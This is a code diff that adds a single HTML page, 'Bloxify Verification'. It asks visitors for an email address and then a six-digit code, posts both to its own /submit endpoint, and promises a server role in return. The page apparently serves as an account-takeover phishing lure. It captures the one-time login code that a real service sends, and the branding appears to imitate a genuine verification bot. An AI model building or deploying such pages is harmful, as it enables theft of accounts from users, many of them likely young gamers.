@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Bloxify Verification</title>
+<style>
+html, body { margin:0; width:100%; height:100%; overflow:hidden; background:#000; font-family:Arial, sans-serif; color:#eee; }
+#space { position: fixed; width:100%; height:100%; overflow:hidden; }
+.star { position:absolute; width:2px; height:2px; background:white; border-radius:50%; opacity:0.8; box-shadow:0 0 6px rgba(255,255,255,0.8); pointer-events:none; }
+#ui { position:absolute; top:50%; left:50%; transform:translate(-50%, -50%); width:720px; padding:80px; background:linear-gradient(145deg,#111,#222); border-radius:25px; box-shadow:0 0 70px rgba(255,255,255,0.2); text-align:center; animation:float 6s ease-in-out infinite; }
+@keyframes float {50% { transform:translate(-50%, -55%); }}
+h1{font-size:50px;margin-bottom:20px;} p{font-size:18px;color:#aaa;margin-bottom:20px;}
+input{width:95%;padding:18px;margin-top:18px;font-size:20px;border-radius:12px;border:none;background:#222;color:white;}
+button{width:100%;padding:18px;margin-top:20px;font-size:20px;border-radius:12px;border:none;background:#333;color:white;cursor:pointer;transition:0.3s;}
+button:hover{background:#444;}
+#errorMsg{color:#ff5555;font-size:18px;margin-top:16px;display:none;}
+</style>
+</head>
+<body>
+<div id="space"></div>
+<div id="ui">
+<h1>Bloxify Verification</h1>
+<p>Verify your account to access the server.</p>
+
+<div id="emailBox">
+    <input id="email" placeholder="Enter your email">
+    <button onclick="submitEmail()">Submit Email</button>
+</div>
+
+<div id="codeBox" style="display:none;">
+    <input id="code" placeholder="Enter 6-digit code">
+    <button onclick="submitCode()">Submit Code</button>
+</div>
+
+<p id="done" style="display:none;">✅ Verification complete<br>Please wait 5–10 minutes to receive your role!</p>
+<p id="errorMsg">Verification failed, try again.</p>
+</div>
+
+<script>
+// Stars
+const starCount=150; const stars=[];
+for(let i=0;i<starCount;i++){let s=document.createElement("div"); s.className="star"; s.style.left=Math.random()*window.innerWidth+"px"; s.style.top=Math.random()*window.innerHeight+"px"; s.speedX=(Math.random()-0.5)*0.3; s.speedY=(Math.random()-0.5)*0.3; document.getElementById("space").appendChild(s); stars.push(s);}
+function animateStars(){stars.forEach(s=>{let x=parseFloat(s.style.left); let y=parseFloat(s.style.top); x+=s.speedX; y+=s.speedY; if(x<0)x=window.innerWidth; if(x>window.innerWidth)x=0; if(y<0)y=window.innerHeight; if(y>window.innerHeight)y=0; s.style.left=x+"px"; s.style.top=y+"px";}); requestAnimationFrame(animateStars);}
+animateStars();
+
+// UI Flow
+async function submitEmail(){
+    const email=document.getElementById("email").value.trim();
+    if(!email)return;
+    const res=await fetch("/submit",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({email:email})});
+    if(res.ok){
+        document.getElementById("emailBox").style.display="none";
+        document.getElementById("codeBox").style.display="block";
+        document.getElementById("errorMsg").style.display="none";
+    }
+}
+
+async function submitCode(){
+    const email=document.getElementById("email").value.trim();
+    const code=document.getElementById("code").value.trim();
+    if(!code){document.getElementById("errorMsg").style.display="block"; return;}
+    const res=await fetch("/submit",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({email:email,code:code})});
+    if(res.ok){
+        document.getElementById("codeBox").style.display="none";
+        document.getElementById("done").style.display="block";
+        document.getElementById("errorMsg").style.display="none";
+    }else{
+        document.getElementById("errorMsg").style.display="block";
+    }
+}
+</script>
+</body>
+</html>
